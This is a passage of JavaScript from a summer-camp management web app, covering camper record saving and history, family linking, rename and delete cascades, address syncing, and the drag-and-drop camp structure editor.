        physician:_v('cePhys'),physicianPhone:_v('cePhysPh'),
        insuranceProvider:_v('ceInsProv'),insurancePolicy:_v('ceInsPol'),
        camperType:_v('ceType'),swimLevel:_v('ceSwim'),shirtSize:_v('ceShirt'),
        bunkmateRequest:_v('ceBunkmate'),separateFrom:_v('ceSeparate')
    };
    // Merge onto the old record so notes, documents, custom fields, scholarships,
    // and history are preserved through an edit (they aren't on this form).
    roster[full]=Object.assign({},_oldRec,_core);
    // Change log: diff the tracked fields old→new and append a history entry.
    var _changes=_diffCamperFields(_oldRec,_core);
    roster[full].history=Array.isArray(_oldRec.history)?_oldRec.history.slice():[];
    if(!editingCamper){
        roster[full].history.push({ts:new Date().toISOString(),type:'created',changes:[]});
    }else if(_changes.length){
        roster[full].history.push({ts:new Date().toISOString(),type:'edit',changes:_changes});
    }
    if(roster[full].history.length>200) roster[full].history=roster[full].history.slice(-200);
    // Sync address to Campistry Go format
    syncAddressToGo(full,roster[full]);
    // Every camper belongs to a family. Join an EXISTING family only when the
    // camper matches it on 3+ of {last name, address, parent email, parent
    // name} — a shared last name alone is NOT enough. Otherwise start a new,
    // uniquely-keyed family for them.
    if(last){
        var famKey=_resolveFamilyKey(full,_famItem(full,roster[full]));
        if(!famKey){
            famKey='fam_'+last.toLowerCase().replace(/[^a-z0-9]/g,'')+'_'+(existingId||Date.now());
            var p1e={name:roster[full].parent1Name||'',phone:roster[full].parent1Phone||'',email:roster[full].parent1Email||'',relation:'Parent'};
            families[famKey]={
                name:last+' Family',
                households:[{label:'Primary',parents:[p1e],address:[roster[full].street,roster[full].city,roster[full].state,roster[full].zip].filter(Boolean).join(', '),billingContact:true}],
                camperIds:[full],
                balance:0,totalPaid:0,notes:'Added via camper profile'
            };
        } else {
            // Add this camper to the matched family if not already there
            if(families[famKey].camperIds.indexOf(full)<0)families[famKey].camperIds.push(full);
            // Backfill parent info if the primary household had none
            var hh0=families[famKey].households&&families[famKey].households[0];
            if(hh0&&hh0.parents&&hh0.parents[0]&&!hh0.parents[0].name&&roster[full].parent1Name){
                hh0.parents[0].name=roster[full].parent1Name;
                hh0.parents[0].email=roster[full].parent1Email||'';
                hh0.parents[0].phone=roster[full].parent1Phone||'';
            }
            // Update address if family has none
            if(hh0&&!hh0.address&&roster[full].street){
                hh0.address=[roster[full].street,roster[full].city,roster[full].state,roster[full].zip].filter(Boolean).join(', ');
            }
        }
    }
    // Adding a camper directly here (not through an Enrollment application)
    // means they're already accepted into camp — reflect that in Registration
    // immediately, rather than leaving them with zero enrollment record (which
    // meant no Link invite could ever be generated for them and Registration
    // undercounted actual campers).
    var wasNew=!editingCamper;
    if(wasNew)_autoCreateAcceptedEnrollment(full);
    var wasEdit=!!editingCamper;
    // A rename means roster[editingCamper] no longer exists — if their
    // profile page is what's open (which is where Edit is reached from),
    // point it at the new name so the re-render below doesn't hit "not found".
    if(curPage==='camperdetail'&&_camperDetailName===editingCamper)_camperDetailName=full;
    save();closeModal('camperEditModal');render(curPage);toast(editingCamper?'Updated':'Added');
    // Keep any already-issued parent portal invite in sync. The invite stores
    // a snapshot of camper_data at creation time (see _syncParentInviteSnapshot)
    // — without this, bunk/division/allergy/etc. edits made here would never
    // reach a parent who already has portal access until someone manually
    // clicked "Get Invite Link" again.
    _syncInvitesForCamper(full);
    // Fix (b): the camp changed this parent's email on file → move their existing
    // invite to the new email IN PLACE (keeps the signed-up parent connected +
    // preserves token/code), instead of leaving an orphan for the old email.
    var _newParentEmail=(roster[full].parent1Email||'').trim();
    if(wasEdit&&_oldParentEmail&&_newParentEmail&&_oldParentEmail.toLowerCase()!==_newParentEmail.toLowerCase()){
        try{
            var _db=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():null;
            var _camp=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():null;
            if(_db&&_camp){
                _db.rpc('set_parent_invite_email',{p_camp_id:_camp,p_old_email:_oldParentEmail,p_new_email:_newParentEmail}).then(function(res){
                    var d=res&&res.data;
                    if(d&&d.success&&d.moved)toast('Parent portal email updated');
                    else if(d&&d.error==='target_email_exists')toast('Note: an invite already exists for '+_newParentEmail);
                }).catch(function(){});
            }
        }catch(_){}
    }
}
function _autoCreateAcceptedEnrollment(camperName){
    if(Object.values(enrollments).some(function(e){return e.camperName===camperName}))return;
    var c=roster[camperName]||{};
    var last=camperName.split(' ').slice(1).join(' ');
    var id='enr_'+Date.now()+'_'+Math.random().toString(36).substr(2,4);
    enrollments[id]={
        camperName:camperName,camperLast:last,
        parentName:c.parent1Name||'',parentEmail:c.parent1Email||'',parentPhone:c.parent1Phone||'',
        dob:c.dob||'',gender:c.gender||'',
        school:c.school||'',schoolGrade:c.schoolGrade||'',
        street:c.street||'',city:c.city||'',state:c.state||'',zip:c.zip||'',
        allergies:c.allergies||'',medications:c.medications||'',
        session:'',sessionTuition:0,
        status:'accepted',
        statusHistory:[{from:null,to:'accepted',date:new Date().toISOString(),by:'office'}],
        appliedDate:new Date().toISOString().split('T')[0],
        formsRequired:3,formsCompleted:0,
        paymentStatus:'pending',paymentAmount:0,
        notes:'Auto-accepted — added directly via Campers'
    };
}
// ★ #4 cascade helpers. Camper records are keyed by NAME in `roster`, and several
// other stores reference campers by that same name string: families[].camperIds,
// bunkAsgn[bunk], payments[].camper, and the Campistry-Go address book. Rename/delete
// must keep those in sync or the camper is silently orphaned.
function cascadeCamperRename(oldName,newName){
    if(!oldName||!newName||oldName===newName)return;
    try{Object.values(families).forEach(function(f){if(Array.isArray(f.camperIds))f.camperIds=f.camperIds.map(function(c){return c===oldName?newName:c})});}catch(_){}
    try{Object.keys(bunkAsgn).forEach(function(b){if(Array.isArray(bunkAsgn[b]))bunkAsgn[b]=bunkAsgn[b].map(function(c){return c===oldName?newName:c})});}catch(_){}
    try{(payments||[]).forEach(function(p){if(p&&p.camper===oldName)p.camper=newName});}catch(_){}
    try{var raw=localStorage.getItem('campistry_go_data');if(raw){var go=JSON.parse(raw);if(go&&go.addresses&&go.addresses[oldName]){go.addresses[newName]=go.addresses[oldName];delete go.addresses[oldName];localStorage.setItem('campistry_go_data',JSON.stringify(go))}}}catch(_){}
}
function cascadeCamperDelete(name){
    if(!name)return;
    try{Object.values(families).forEach(function(f){if(Array.isArray(f.camperIds))f.camperIds=f.camperIds.filter(function(c){return c!==name})});}catch(_){}
    try{Object.keys(bunkAsgn).forEach(function(b){if(Array.isArray(bunkAsgn[b]))bunkAsgn[b]=bunkAsgn[b].filter(function(c){return c!==name})});}catch(_){}
    // payments are intentionally KEPT — silently erasing billing history when a camper
    // is removed is worse than leaving the (now-deleted) name on the financial record.
    try{var raw=localStorage.getItem('campistry_go_data');if(raw){var go=JSON.parse(raw);if(go&&go.addresses&&go.addresses[name]){delete go.addresses[name];localStorage.setItem('campistry_go_data',JSON.stringify(go))}}}catch(_){}
}
async function deleteCamper(n){
    if(!n||!roster[n])return;
    var ok=await confirmDialog({title:'Delete Camper?',message:'<strong>'+esc(n)+'</strong> will be permanently deleted.',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    var capturedRoster=roster[n];
    var capturedFamilyLinks=[];
    Object.entries(families).forEach(function(pair){if((pair[1].camperIds||[]).indexOf(n)>=0)capturedFamilyLinks.push(pair[0])});
    var capturedBunks=[];
    Object.entries(bunkAsgn).forEach(function(pair){if(Array.isArray(pair[1])&&pair[1].indexOf(n)>=0)capturedBunks.push(pair[0])});
    delete roster[n];
    cascadeCamperDelete(n);
    save();
    // Deleting from their own profile page leaves nothing to show there —
    // head back to the list instead of rendering a "not found" page.
    if(curPage==='camperdetail'&&_camperDetailName===n)nav('campers');else render(curPage);
    toast('Camper deleted','ok',{actionLabel:'Undo',onAction:function(){
        roster[n]=capturedRoster;
        capturedFamilyLinks.forEach(function(fk){if(families[fk]){if(!families[fk].camperIds)families[fk].camperIds=[];if(families[fk].camperIds.indexOf(n)<0)families[fk].camperIds.push(n)}});
        capturedBunks.forEach(function(b){if(!bunkAsgn[b])bunkAsgn[b]=[];if(bunkAsgn[b].indexOf(n)<0)bunkAsgn[b].push(n)});
        save();render(curPage);toast('Camper restored');
    }});
}
function grOpts(div){var o=[''];if(div&&structure[div]){var ord=structure[div].gradeOrder,keys=Object.keys(structure[div].grades||{});(Array.isArray(ord)&&ord.length?ord.filter(function(g){return g in(structure[div].grades||{})}):keys.sort()).forEach(function(g){o.push(g)})}return o}
function bkOpts(div,gr){var o=[''];if(div&&gr&&structure[div]&&structure[div].grades&&structure[div].grades[gr])(structure[div].grades[gr].bunks||[]).forEach(function(b){o.push(b)});return o}
// Reverse lookup: which division/grade does this bunk name belong to? Used
// to keep roster[name].division/grade consistent whenever a bunk is assigned
// directly (Bunk Builder drag-drop, auto-assign, bunk-rename migration).
function _bunkDivGrade(bunkName){
    if(!bunkName)return null;
    for(var div in structure){
        var grades=(structure[div]&&structure[div].grades)||{};
        for(var gr in grades){
            if((grades[gr].bunks||[]).indexOf(bunkName)!==-1)return{div:div,gr:gr};
        }
    }
    return null;
}

// Sync camper address to Campistry Go's address store
function syncAddressToGo(camperName,camperData){
    if(!camperData.street)return;
    // Single-camper sync (used after editing one camper)
    try{
        var goRaw=localStorage.getItem('campistry_go_data');
        var goData=goRaw?JSON.parse(goRaw):{};
        if(!goData.addresses)goData.addresses={};
        var existing=goData.addresses[camperName]||{};
        var unchanged=existing.street===camperData.street&&existing.city===camperData.city;
        if(unchanged)return; // Skip if nothing changed
        goData.addresses[camperName]={
            street:camperData.street||'',city:camperData.city||'',
            state:camperData.state||'NY',zip:camperData.zip||'',
            lat:null,lng:null,geocoded:false,
            transport:existing.transport||'bus',rideWith:existing.rideWith||''
        };
        localStorage.setItem('campistry_go_data',JSON.stringify(goData));
    }catch(e){console.warn('[Me] Go sync error:',e)}
}

// Bulk sync — ONE read, ONE diff, ONE write. Runs on load.
function syncAllAddressesToGo(){
    try{
        var goRaw=localStorage.getItem('campistry_go_data');
        var goData=goRaw?JSON.parse(goRaw):{};
        if(!goData.addresses)goData.addresses={};
        var changed=0;
        Object.entries(roster).forEach(function([name,data]){
            if(!data.street)return;
            var existing=goData.addresses[name]||{};
            // Skip if address hasn't changed
            if(existing.street===data.street&&existing.city===data.city)return;
            goData.addresses[name]={
                street:data.street||'',city:data.city||'',
                state:data.state||'NY',zip:data.zip||'',
                lat:null,lng:null,geocoded:false,
                transport:existing.transport||'bus',rideWith:existing.rideWith||''
            };
            changed++;
        });
        if(changed>0){
            localStorage.setItem('campistry_go_data',JSON.stringify(goData));
            console.log('[Me→Go] Bulk synced '+changed+' new/changed addresses');
        }
    }catch(e){console.warn('[Me] Bulk Go sync error:',e)}
}

// ── STRUCTURE ────────────────────────────────────────────────────
function _getDivisionOrder(){
    try{
        var gs=window.loadGlobalSettings?window.loadGlobalSettings():{};
        // ★ Prefer the DEDICATED parent-division order (app1.divisionOrder). It holds
        //   PARENT names only and is written exclusively by Me division reorders, so it
        //   can't be clobbered by Flow's schedule-column order (which shares the older
        //   app1.manualColumnOrder key but stores grade-level keys). Fall back to
        //   manualColumnOrder for legacy camps that never saved a division order.
        var div=(gs.app1&&gs.app1.divisionOrder);
        if(Array.isArray(div)&&div.length)return div;
        var ord=(gs.app1&&gs.app1.manualColumnOrder)||[];
        return Array.isArray(ord)?ord:[];
    }catch(_){return []}
}
function _saveDivisionOrder(order){
    try{
        var gs=window.loadGlobalSettings?window.loadGlobalSettings():{};
        if(!gs.app1)gs.app1={};
        // Authoritative parent-division order → its OWN key so Flow column drags can't
        // wipe it. Keep writing manualColumnOrder too for any legacy reader.
        gs.app1.divisionOrder=order;
        gs.app1.manualColumnOrder=order;
        if(window.saveGlobalSettings)window.saveGlobalSettings('app1',gs.app1);
    }catch(e){console.warn('[CampistryMe] save order failed',e)}
}
function _sortedDivisions(){
    var keys=Object.keys(structure);
    var ord=_getDivisionOrder();
    if(ord.length>0){
        var pos={};ord.forEach(function(k,i){pos[k]=i});
        keys.sort(function(a,b){
            var ai=pos[a]==null?9999:pos[a];
            var bi=pos[b]==null?9999:pos[b];
            if(ai!==bi)return ai-bi;
            return a.localeCompare(b);
        });
    }else{
        keys.sort(function(a,b){
            var na=parseInt(a),nb=parseInt(b);
            if(!isNaN(na)&&!isNaN(nb))return na-nb;
            return a.localeCompare(b);
        });
    }
    return keys.map(function(k){return [k,structure[k]]});
}
function _sortedGrades(divData){
    var entries=Object.entries(divData.grades||{});
    var ord=divData.gradeOrder;
    if(Array.isArray(ord)&&ord.length>0){
        var pos={};ord.forEach(function(k,i){pos[k]=i});
        entries.sort(function(a,b){
            var ai=pos[a[0]]==null?9999:pos[a[0]];
            var bi=pos[b[0]]==null?9999:pos[b[0]];
            if(ai!==bi)return ai-bi;
            return a[0].localeCompare(b[0]);
        });
    }
    return entries;
}
function moveDivision(name,dir){
    var keys=_sortedDivisions().map(function(e){return e[0]});
    var i=keys.indexOf(name);
    if(i<0)return;
    var j=i+dir;
    if(j<0||j>=keys.length)return;
    var tmp=keys[i];keys[i]=keys[j];keys[j]=tmp;
    _saveDivisionOrder(keys);
    render(curPage);
}
function _commitStructureReorder(){
    // Read DOM and rebuild structure objects in the new order.
    var listEl=document.getElementById('meDivList');
    if(!listEl)return;
    listEl.querySelectorAll('.me-div-card').forEach(function(card){
        var divName=card.getAttribute('data-div');
        if(!divName||!structure[divName])return;
        var divColor=structure[divName].color;
        var newGrades={};
        var gradeOrder=[];
        card.querySelectorAll('.me-grade-block').forEach(function(gBlock){
            var gn=gBlock.getAttribute('data-grade');
            if(!gn||!structure[divName].grades||!structure[divName].grades[gn])return;
            var newBunks=Array.prototype.map.call(gBlock.querySelectorAll('.me-card-bunk'),function(c){return c.getAttribute('data-bunk')||c.textContent.trim()}).filter(Boolean);
            newGrades[gn]={bunks:newBunks};
            gradeOrder.push(gn);
        });
        structure[divName]={color:divColor,grades:newGrades,gradeOrder:gradeOrder};
    });
    save();
}

// Camp Structure and Bunk Builder are presented together as one "Camp
// Layout" area (one sidebar entry, cross-linked sub-tabs) even though they
// stay two independently gated pages underneath — a role can have view-only
// Structure and edit-level Bunk Builder (or vice versa), so each keeps its
// own #page-* pane and its own me.structure/me.bunkbuilder capability check
// exactly as before. This just adds the tab strip that jumps between them.
function _layoutTabsHtml(active){
    var tabs=[{k:'structure',l:'Structure'},{k:'bunkbuilder',l:'Bunk Builder'}];
    return '<div style="display:flex;gap:0;border-bottom:1px solid var(--s200);margin-bottom:14px">'+tabs.map(function(t){
        return '<button class="me-btn me-btn--ghost" data-page="'+t.k+'" style="padding:8px 16px;font-size:.8rem;font-weight:600;border-bottom:2px solid '+(active===t.k?'var(--me)':'transparent')+';color:'+(active===t.k?'var(--me)':'var(--s400)')+';border-radius:0" onclick="CampistryMe.nav(\''+t.k+'\')">'+t.l+'</button>';
    }).join('')+'</div>';
}

// Reports and Print Sheets are presented together as one "Reports & Sheets"
// area (one sidebar entry, cross-linked sub-tabs), same pattern as Structure/
// Bunk Builder — they stay two independently gated pages (me.reports is
// view-only by design, me.printsheets supports full edit, and roles split
// them differently: e.g. Office gets both, Bookkeeper gets reports but not
// printsheets), so each keeps its own #page-* pane and capability check.
function _reportsTabsHtml(active){
    var tabs=[{k:'reports',l:'Reports'},{k:'printsheets',l:'Print Sheets'}];
    return '<div style="display:flex;gap:0;border-bottom:1px solid var(--s200);margin-bottom:14px">'+tabs.map(function(t){
        return '<button class="me-btn me-btn--ghost" data-page="'+t.k+'" style="padding:8px 16px;font-size:.8rem;font-weight:600;border-bottom:2px solid '+(active===t.k?'var(--me)':'transparent')+';color:'+(active===t.k?'var(--me)':'var(--s400)')+';border-radius:0" onclick="CampistryMe.nav(\''+t.k+'\')">'+t.l+'</button>';
    }).join('')+'</div>';
}

function renderStructure(){
    var c=document.getElementById('page-structure'),divs=_sortedDivisions();
    var h=_layoutTabsHtml('structure');
    h+='<div class="sec-hd"><div><h2 class="sec-title">Camp Structure</h2></div><div class="sec-actions"><button class="me-btn me-btn--pri" onclick="CampistryMe.addDiv()">+ Add Division</button></div></div>';
    if(!divs.length){h+='<div class="me-empty"><h3>No divisions yet</h3><p>Create your camp structure.</p></div>'}
    else{
        h+='<div id="meDivList"><div style="font-size:.72rem;color:var(--s400);margin-bottom:8px">Drag the ⋮⋮ handles or any chip to reorder divisions, grades, and bunks in place.</div>';
        divs.forEach(function([dn,dd],ix){
            var grades=_sortedGrades(dd);
            var bCt=grades.reduce(function(s,e){return s+(e[1].bunks||[]).length},0);
            var col=dd.color||'#94A3B8';
            var upDis=ix===0?' disabled':'';
            var dnDis=ix===divs.length-1?' disabled':'';
            var dHeads=divisionHeads[dn]||[];
            var dHeadChip=dHeads.length
                ?dHeads.map(function(s){return esc(s.name);}).join(', ')
                :'+ Assign division head';
            h+='<div class="me-card me-div-card" data-div="'+je(dn)+'" style="margin-bottom:10px"><div class="me-card-head"><div style="display:flex;align-items:center;gap:8px">'
                +'<span class="me-grip me-div-grip" title="Drag to reorder division" style="cursor:grab;color:var(--s400);font-size:1rem;line-height:1;padding:0 4px;user-select:none">⋮⋮</span>'
                +'<div style="width:10px;height:10px;border-radius:3px;background:'+col+'"></div><h3 style="margin:0">'+esc(dn)+'</h3><span style="font-size:.75rem;color:var(--s400)">'+grades.length+' grades · '+bCt+' bunks</span></div><div style="display:flex;gap:4px;align-items:center">'
                +'<button class="me-btn me-btn--ghost me-btn--sm" title="Move up"'+upDis+' onclick="CampistryMe.moveDivision(\''+je(dn)+'\',-1)" style="padding:4px 8px">↑</button>'
                +'<button class="me-btn me-btn--ghost me-btn--sm" title="Move down"'+dnDis+' onclick="CampistryMe.moveDivision(\''+je(dn)+'\',1)" style="padding:4px 8px">↓</button>'
                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editDiv(\''+je(dn)+'\')">Edit</button>'
                +'<button class="me-btn me-btn--danger me-btn--sm" onclick="CampistryMe.deleteDiv(\''+je(dn)+'\')">Delete</button>'
                +'</div></div>'
                +'<div style="padding:0 18px 10px;display:flex;align-items:center;gap:6px;cursor:pointer" onclick="CampistryMe.openDivisionHeadModal(\''+je(dn)+'\')" title="Manage this division\'s head(s) — who gets notified for this division">'
                +'<span style="font-size:.7rem;color:var(--s400);font-weight:600">Division Head:</span>'
                +'<span style="font-size:.72rem;'+(dHeads.length?'color:var(--s600);font-weight:600':'color:var(--me);font-weight:600')+'">'+dHeadChip+'</span>'
                +'</div>';
            h+='<div class="me-grade-list" data-div="'+je(dn)+'" style="padding:14px 18px">';
            grades.forEach(function([gn,gd]){
                h+='<div class="me-grade-block" data-grade="'+je(gn)+'" style="margin-bottom:10px;padding:6px 8px;border:1px dashed transparent;border-radius:6px">'
                    +'<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px">'
                        +'<span class="me-grip me-grade-grip" title="Drag to reorder grade" style="cursor:grab;color:var(--s400);font-size:.85rem;line-height:1;padding:0 2px;user-select:none">⋮⋮</span>'
                        +'<div style="font-size:.8rem;font-weight:600;color:var(--s700)">'+esc(gn)+'</div>'
                    +'</div>'
                    +'<div class="me-card-bunks" data-grade="'+je(gn)+'" style="display:flex;flex-wrap:wrap;gap:4px;padding-left:18px">';
                (gd.bunks||[]).forEach(function(b){
                    var rCt=Object.values(roster).filter(function(c){return c.bunk===b}).length;
                    var mCt=bunkManualCounts[b];
                    var isOverride=(mCt!=null);
                    var dispCt=isOverride?mCt:rCt;
                    var badgeTip=isOverride?'Manual count (click to edit)':'Roster count (click to set manual count)';
                    var badgeStyle=isOverride
                        ?'background:var(--me);color:#fff;'
                        :(rCt?'background:#e2e8f0;color:#475569;':'background:#f1f5f9;color:#94a3b8;');
                    h+='<span class="me-card-bunk" data-bunk="'+je(b)+'" draggable="true" style="display:inline-flex;align-items:center;gap:4px;padding:3px 6px 3px 8px;border-radius:6px;border:1px solid var(--s200);font-size:.7rem;font-weight:600;color:var(--s600);cursor:grab;user-select:none">'
                        +esc(b)
                        +'<span class="bunk-ct-pill" title="'+esc(badgeTip)+'" onclick="event.stopPropagation();CampistryMe.openBunkCountModal(\''+je(b)+'\')" style="'+badgeStyle+'min-width:18px;height:16px;border-radius:8px;font-size:.65rem;font-weight:700;padding:0 5px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;">'+dispCt+'</span>'
                        +'</span>';
                });
                h+='</div></div>';
            });
            h+='</div></div>';
        });
        h+='</div>';
    }

    c.innerHTML=h;
    // Wire drag-drop on division cards
    var listEl=document.getElementById('meDivList');
    if(listEl){
        _meReorderInit(listEl,'.me-div-card');
        listEl.querySelectorAll('.me-div-card').forEach(function(card){
            _meAttachItemDrag(card);
            card.addEventListener('dragend',function(){
                var newOrder=Array.prototype.map.call(listEl.querySelectorAll('.me-div-card'),function(el){return el.getAttribute('data-div')});
                _saveDivisionOrder(newOrder);
                _commitStructureReorder();
                render(curPage);
            });
        });
        // Wire drag-drop on grade blocks within each division card
        listEl.querySelectorAll('.me-grade-list').forEach(function(gradeList){
            _meReorderInit(gradeList,'.me-grade-block');
            gradeList.querySelectorAll('.me-grade-block').forEach(function(gBlock){
                _meAttachItemDrag(gBlock);
                gBlock.addEventListener('dragend',function(){
                    _commitStructureReorder();
                    render(curPage);
                });
            });
        });
        // Wire drag-drop on bunk chips within each grade block
        listEl.querySelectorAll('.me-card-bunks').forEach(function(bunkRow){
            _meHorizontalReorderInit(bunkRow,'.me-card-bunk');
            bunkRow.querySelectorAll('.me-card-bunk').forEach(function(chip){
                _meAttachItemDrag(chip);
                chip.addEventListener('dragend',function(){
                    _commitStructureReorder();
                    render(curPage);
                });
            });
        });
    }
}

// ── Drag-drop helpers ──
// Containers scope dragover handling to direct children matching childSelector,
// so nested draggables (e.g. bunk chip inside a grade block inside a division
// card) reorder within their own list without bubbling up to the parent list.
function _meReorderInit(containerEl,childSelector){
    if(!containerEl||containerEl._meDragInit)return;
    containerEl._meDragInit=true;
    containerEl.addEventListener('dragover',function(e){
        var dragging=containerEl.querySelector(':scope > .me-dragging');
        if(!dragging||!dragging.matches(childSelector))return;
        e.preventDefault();e.dataTransfer.dropEffect='move';
        var siblings=Array.prototype.slice.call(containerEl.children).filter(function(el){return el!==dragging&&el.matches(childSelector)});
        var nextSibling=siblings.find(function(sib){
            var box=sib.getBoundingClientRect();
            return e.clientY<box.top+box.height/2;
        });
        containerEl.insertBefore(dragging,nextSibling||null);
    });
}
function _meHorizontalReorderInit(containerEl,childSelector){
    if(!containerEl||containerEl._meDragInit)return;
    containerEl._meDragInit=true;
    containerEl.addEventListener('dragover',function(e){
        var dragging=containerEl.querySelector(':scope > .me-dragging');
        if(!dragging||!dragging.matches(childSelector))return;
        e.preventDefault();e.dataTransfer.dropEffect='move';
        var siblings=Array.prototype.slice.call(containerEl.children).filter(function(el){return el!==dragging&&el.matches(childSelector)});
        var nextSibling=siblings.find(function(sib){
            var box=sib.getBoundingClientRect();
            return e.clientX<box.left+box.width/2;
        });
        containerEl.insertBefore(dragging,nextSibling||null);
    });
}
function _meAttachItemDrag(itemEl){
    if(!itemEl||itemEl._meItemDragInit)return;
    itemEl._meItemDragInit=true;
    itemEl.draggable=true;
    itemEl.addEventListener('dragstart',function(e){
        e.stopPropagation();
        itemEl.classList.add('me-dragging');
        try{e.dataTransfer.effectAllowed='move';e.dataTransfer.setData('text/plain','reorder')}catch(_){}
    });
    itemEl.addEventListener('dragend',function(e){
        e.stopPropagation();
        itemEl.classList.remove('me-dragging');
    });
}

function _renderBunkChipsHTML(bunks){
    var inner='';
    (bunks||[]).forEach(function(b){
        inner+='<span class="me-bunk-chip" draggable="true"><span class="me-bunk-name" data-orig="'+esc(b)+'">'+esc(b)+'</span><button type="button" class="me-bunk-x" title="Remove">×</button></span>';
    });
    return '<div class="fg"><label class="fl">Bunks <span style="font-weight:400;color:var(--s400);font-size:.7rem">(drag to reorder)</span></label>'
        +'<div class="me-bunk-list dmGradeBunks">'+inner+'</div>'
        +'<div style="display:flex;gap:6px;margin-top:6px"><input type="text" class="fi me-bunk-input" placeholder="Add bunk and press Enter" style="flex:1"><button type="button" class="me-btn me-btn--sec me-btn--sm me-bunk-add">+ Add</button></div>'
        +'</div>';
}
// Days-of-week a grade is present. Per-grade picker in the division editor;
// unchecked days hide that grade's column in the Master Scheduler, Unified
// view, Daily grid and Print Center on those weekdays.
var DM_DAYS=['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
function _styleDayChip(btn){
    var on=btn.getAttribute('data-on')==='1';
    btn.style.cssText='width:24px;height:24px;border-radius:50%;padding:0;line-height:1;font-size:.7rem;font-weight:700;cursor:pointer;user-select:none;border:1px solid '
        +(on?'var(--accent,#00C896)':'var(--s300,#cbd5e1)')+';background:'
        +(on?'var(--accent,#00C896)':'var(--s100,#f1f5f9)')+';color:'
        +(on?'#fff':'var(--s400,#94a3b8)');
}
function _styleSgChip(btn){
    var on=btn.getAttribute('data-on')==='1';
    btn.style.cssText='padding:2px 9px;border-radius:999px;font-size:.68rem;font-weight:600;cursor:pointer;user-select:none;border:1px solid '
        +(on?'var(--me)':'var(--s300,#cbd5e1)')+';background:'
        +(on?'var(--me)':'var(--s100,#f1f5f9)')+';color:'
        +(on?'#fff':'var(--s400,#94a3b8)');
}
function _renderGradeRowHTML(gn,bunks,daysPresent,schoolGrades){
    var present=Array.isArray(daysPresent)?daysPresent:null; // null → present all days
    var dayChips=DM_DAYS.map(function(d){
        var on=!present||present.indexOf(d)!==-1;
        return '<button type="button" class="dm-day-chip" data-day="'+d+'" data-on="'+(on?'1':'0')+'" title="'+d+'">'+d.charAt(0)+'</button>';
    }).join('');
    var sgOn=Array.isArray(schoolGrades)?schoolGrades:[];
    var sgChips=_schoolGradeCatalog().map(function(sg){
        var on=sgOn.indexOf(sg)>=0;
        return '<button type="button" class="dm-sg-chip" data-sg="'+esc(sg)+'" data-on="'+(on?'1':'0')+'">'+esc(sg)+'</button>';
    }).join('');
    return '<div class="fg dm-grade-row" style="background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px;cursor:grab">'
        +'<div class="fr" style="align-items:center;gap:6px">'
            +'<span class="me-grip" title="Drag to reorder grade" style="cursor:grab;color:var(--s400);font-size:1rem;line-height:1;padding:0 4px;user-select:none">⋮⋮</span>'
            +'<div class="fg" style="flex:1;margin:0"><label class="fl">Grade Name</label><input class="fi dmGradeN" data-orig="'+esc(gn||'')+'" value="'+esc(gn||'')+'" placeholder="e.g. 1st Grade"></div>'
            +'<button type="button" class="me-btn me-btn--ghost me-btn--sm dm-grade-remove" title="Remove grade" style="color:var(--danger,#dc2626)">×</button>'
        +'</div>'
        +'<div class="dm-grade-days" style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;margin:6px 0 2px">'
            +'<span style="font-size:.7rem;color:var(--s400);user-select:none" title="Days this grade is around. Unchecked days hide its column in the Master Scheduler, Unified view and Print Center.">Days present:</span>'
            +dayChips
        +'</div>'
        +'<div class="dm-grade-sg" style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;margin:4px 0 2px">'
            +'<span style="font-size:.7rem;color:var(--s400);user-select:none" title="Which real school grade(s) this bunk group is for. Leave empty to skip this check. When set, Auto-Generate in Bunk Builder only ever places a camper in a bunk group whose school grades include theirs.">School grade(s):</span>'
            +sgChips
        +'</div>'
        +_renderBunkChipsHTML(bunks)
        +'</div>';
}
function _wireGradeRow(rowEl){
    if(!rowEl)return;
    _meAttachItemDrag(rowEl);
    // Per-day presence toggles — click flips on/off and restyles.
    rowEl.querySelectorAll('.dm-day-chip').forEach(function(chip){
        _styleDayChip(chip);
        chip.onclick=function(){
            chip.setAttribute('data-on',chip.getAttribute('data-on')==='1'?'0':'1');
            _styleDayChip(chip);
        };
    });
    // School-grade mapping toggles — same on/off chip pattern as days present.
    rowEl.querySelectorAll('.dm-sg-chip').forEach(function(chip){
        _styleSgChip(chip);
        chip.onclick=function(){
            chip.setAttribute('data-on',chip.getAttribute('data-on')==='1'?'0':'1');
            _styleSgChip(chip);
        };
    });
    var rmBtn=rowEl.querySelector('.dm-grade-remove');
    if(rmBtn)rmBtn.onclick=async function(){var ok=await confirmDialog({title:'Remove Grade?',message:'This grade group will be removed.',confirmLabel:'Remove',danger:true});if(ok)rowEl.remove()};
    var bunkList=rowEl.querySelector('.me-bunk-list');
    var addInp=rowEl.querySelector('.me-bunk-input');
    var addBtn=rowEl.querySelector('.me-bunk-add');
    if(bunkList){
        _meHorizontalReorderInit(bunkList,'.me-bunk-chip');
        bunkList.querySelectorAll('.me-bunk-chip').forEach(_wireBunkChip);
    }
    function addBunk(){
        var v=(addInp.value||'').trim();
        if(!v)return;
        // Allow multiple comma-separated bunks via the add input.
        v.split(',').map(function(s){return s.trim()}).filter(Boolean).forEach(function(name){
            var span=document.createElement('span');
            span.className='me-bunk-chip';span.draggable=true;
            span.innerHTML='<span class="me-bunk-name" data-orig="'+esc(name)+'">'+esc(name)+'</span><button type="button" class="me-bunk-x" title="Remove">×</button>';
            bunkList.appendChild(span);
            _wireBunkChip(span);
        });
        addInp.value='';addInp.focus();
    }
    if(addBtn)addBtn.onclick=addBunk;
    if(addInp)addInp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();addBunk()}});
}
function _wireBunkChip(chip){
    _meAttachItemDrag(chip);
    var x=chip.querySelector('.me-bunk-x');
    if(x)x.onclick=function(){chip.remove()};
    // ★★★ CB-94: in-place rename affordance. Double-click the bunk name → inline
    // input; on commit the visible text changes but the span's data-orig keeps the
    // ORIGINAL name, so saveDiv can detect the rename and MIGRATE the bunk's
    // schedules (instead of purge-old + create-new, which destroyed the old bunk's
    // cloud schedule rows on a simple typo fix).
    var nameEl=chip.querySelector('.me-bunk-name');
    if(nameEl){
